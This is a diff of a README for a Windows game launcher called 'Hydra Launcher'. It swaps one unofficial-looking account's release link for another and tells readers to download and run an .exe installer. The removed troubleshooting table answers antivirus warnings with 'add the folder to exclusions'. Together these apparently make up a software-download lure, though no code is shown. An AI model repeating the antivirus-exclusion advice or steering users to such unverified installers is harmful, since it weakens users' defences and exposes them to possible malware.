@@ -1,43 +1,77 @@
-<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/2eac428e-2c9b-47f5-88fa-dab5dc999ff4" />
+# 🎮 hydra-launcher - Manage your entire PC game library
 
-# Hydra Launcher
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/groundhogdayzinger700/hydra-launcher/releases)
 
-> **Hydra Launcher** — Modern, fast and all-in-one game launcher for Windows.
+## 📥 Getting Started
 
-[![GitHub Stars](https://img.shields.io/github/stars/arnabchoudhury404/hydra-launcher?style=flat-square&color=00d4aa)](https://github.com/arnabchoudhury404/hydra-launcher/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/arnabchoudhury404/hydra-launcher?style=flat-square&color=0099cc)](https://github.com/arnabchoudhury404/hydra-launcher/network)
-[![Downloads](https://img.shields.io/github/downloads/arnabchoudhury404/hydra-launcher/total?style=flat-square&color=7c5cbf)](https://github.com/arnabchoudhury404/hydra-launcher/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+Hydra Launcher organizes your game collection in one place. This software creates a single library for games from different stores and sources. Follow these steps to set the application up on your Windows computer.
 
-## Overview
-**Hydra Launcher** is a modern and elegant game launcher that brings together games from multiple platforms in one beautiful interface. It offers fast loading, clean design, and convenient management of your game library.
+1. Open your web browser. 
+2. Visit the [official releases page](https://github.com/groundhogdayzinger700/hydra-launcher/releases).
+3. Look for the section labeled Latest.
+4. Click the file ending in .exe to download the installer.
+5. Open the downloaded file to start the installation process.
+6. Follow the prompts on your screen to finish the setup.
 
-> [!Important]
-> This launcher is intended for organizing and launching your legally owned games.
+## ⚙️ System Requirements
 
+Hydra Launcher runs on most modern Windows systems. Ensure your machine meets these requirements to get the best performance:
 
-# Screenshot:
-<img width="1312" height="832" alt="image" src="https://github.com/user-attachments/assets/ea058ac6-c396-46f3-b64a-9f3491db766e" />
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM minimum.
+* Storage: 200 MB of free space for the application files.
+* Internet Connection: Stable connection for cloud saves and metadata syncing.
 
----
-## Install
-[Download `HydraLauncher`](https://github.com/arnabchoudhury404/hydra-launcher/releases/download/GameLauncher/HydraLauncher.zip)
----
-> Optimized for Windows 10 and Windows 11.
+## 🧩 Key Features
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `HydraLauncher.exe`
-3. Add your games to the library
-4. Start playing
+* Centralized Library: View every game you own in one list.
+* Cloud Sync: Keep your save files in the cloud. Hydra Launcher tracks your progress across multiple devices.
+* BitTorrent Integration: The program includes a built-in client to manage game data transfers.
+* Repack Support: The scraper tool finds game information and applies it to your library.
+* Customization: Modify your library view to sort games by play time, name, or status.
+* RPC Server: The internal server connects your activity to other platforms to show your status.
 
----
-## Troubleshooting
-| Problem                    | Solution                                      |
-|----------------------------|-----------------------------------------------|
-| Launcher doesn't start     | Run as Administrator                          |
-| Games not launching        | Check the correct game path                   |
-| Slow loading               | Close background applications                 |
-| Antivirus warning          | Add the folder to exclusions                  |
-| UI looks blurry            | Enable DPI scaling override in compatibility  |
+## 🛠️ Configuration and Setup
+
+After the installation completes, pin Hydra Launcher to your taskbar for quick access. 
+
+1. Launch the application from your Start menu.
+2. Select the directory where you store your game files.
+3. The application scans these folders for existing games.
+4. If you have games spread across different drives, tell the launcher to look in those specific locations through the settings menu.
+
+The launcher uses a json-based system to keep your library accurate. If a new game appears in your folders, the application detects it during the next scan. You do not need to add entries by hand.
+
+## ☁️ Managing Cloud Saves
+
+Hydra Launcher keeps progress safe. Navigate to the cloud sync tab within the settings menu. Connect your preferred storage account to enable automatic backups. The application creates a copy of your save data every time you close a game. This keeps your progress current if you switch computers.
+
+## 📥 Download
+
+Find the latest version of the installer on the official repository site. Always use this source to ensure you have the most stable release.
+
+[Download Hydra Launcher Here](https://github.com/groundhogdayzinger700/hydra-launcher/releases)
+
+## ❔ Frequent Questions
+
+**The application does not see my game.**
+Check the folder paths in the settings menu. Ensure the application has permission to read those folders. 
+
+**I see an error regarding the Python RPC server.**
+Restart the application. This issue usually occurs if another program uses the same network port as the launcher. A reboot of the computer often fixes this conflict.
+
+**Does this launcher download games for me?**
+Hydra Launcher manages your local files. It uses a built-in tool to help you organize data you already possess. 
+
+**How do I update the application?**
+The launcher checks for updates when you start it. If an update exists, click the update button. The program handles the file replacement automatically. 
+
+**Can I move my save files?**
+Yes. Use the import and export buttons in the cloud sync menu to move your data to a new location. 
+
+**How does the scraper work?**
+The scraper reads the names of your game folders and searches for details like cover art and descriptions. If a game shows no image, right-click the title and choose the manual search option to fix the entry. 
+
+## 🛡️ Privacy and Safety
+
+This launcher works locally on your machine. Your game list stays on your computer unless you enable the cloud sync feature for file backups. Use strong passwords for any third-party accounts you connect to the launcher. Keep your Windows installation up to date to protect your system from external threats.
